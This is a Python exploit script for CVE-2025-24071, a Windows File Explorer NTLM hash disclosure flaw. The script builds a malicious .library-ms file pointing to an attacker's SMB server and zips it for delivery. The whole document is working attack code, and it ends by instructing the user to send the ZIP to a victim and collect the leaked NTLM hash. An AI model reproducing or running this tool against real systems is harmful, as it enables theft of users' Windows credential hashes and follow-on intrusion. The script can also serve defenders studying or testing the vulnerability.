#!/usr/bin/env python3
# Exploit Title: Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure
# Exploit Author: Mohammed Idrees Banyamer
# Twitter/GitHub:https://github.com/mbanyamer
# Date: 2025-05-27
# CVE: CVE-2025-24071
# Vendor: Microsoft
# Affected Versions: Windows 10/11 (All supporting .library-ms and SMB)
# Tested on: Windows 11 (23H2)
# Type: Local / Remote (NTLM Leak)
# Platform: Windows
# Vulnerability Type: Information Disclosure
# Description:
#   Windows Explorer automatically initiates an SMB authentication request when a
#   .library-ms file is extracted from a ZIP archive. This causes NTLM credentials
#   (in hashed format) to be leaked to a remote SMB server controlled by the attacker.
#   No user interaction is required beyond extraction.

import zipfile
from pathlib import Path
import argparse
import re
import sys
from colorama import Fore, Style

def create_library_ms(ip: str, filename: str, output_dir: Path) -> Path:
    """Creates a malicious .library-ms file pointing to an attacker's SMB server."""
    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>'''

    output_file = output_dir / f"{filename}.library-ms"
    output_file.write_text(payload, encoding="utf-8")
    return output_file

def build_zip(library_file: Path, output_zip: Path):
    """Packages the .library-ms file into a ZIP archive."""
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.write(library_file, arcname=library_file.name)
    print(f"{Fore.GREEN}[+] Created ZIP: {output_zip}{Style.RESET_ALL}")

def is_valid_ip(ip: str) -> bool:
    return re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) is not None

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-24071 - NTLM Hash Disclosure via .library-ms ZIP Archive",
        epilog="example:\n  python3 CVE-2025-24071_tool.py -i 192.168.1.100 -n payload1 -o ./output_folder --keep",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("-i", "--ip", required=True, help="Attacker SMB IP address (e.g., 192.168.1.100)")
    parser.add_argument("-n", "--name", default="malicious", help="Base filename (default: malicious)")
    parser.add_argument("-o", "--output", default="output", help="Output directory (default: ./output)")
    parser.add_argument("--keep", action="store_true", help="Keep .library-ms file after ZIP creation")

    args = parser.parse_args()

    if not is_valid_ip(args.ip):
        print(f"{Fore.RED}[!] Invalid IP address: {args.ip}{Style.RESET_ALL}")
        sys.exit(1)

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"{Fore.CYAN}[*] Generating malicious .library-ms file...{Style.RESET_ALL}")
    library_file = create_library_ms(args.ip, args.name, output_dir)
    zip_file = output_dir / f"{args.name}.zip"
    build_zip(library_file, zip_file)

    if not args.keep:
        library_file.unlink()
        print(f"{Fore.YELLOW}[-] Removed intermediate .library-ms file{Style.RESET_ALL}")

    print(f"{Fore.MAGENTA}[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()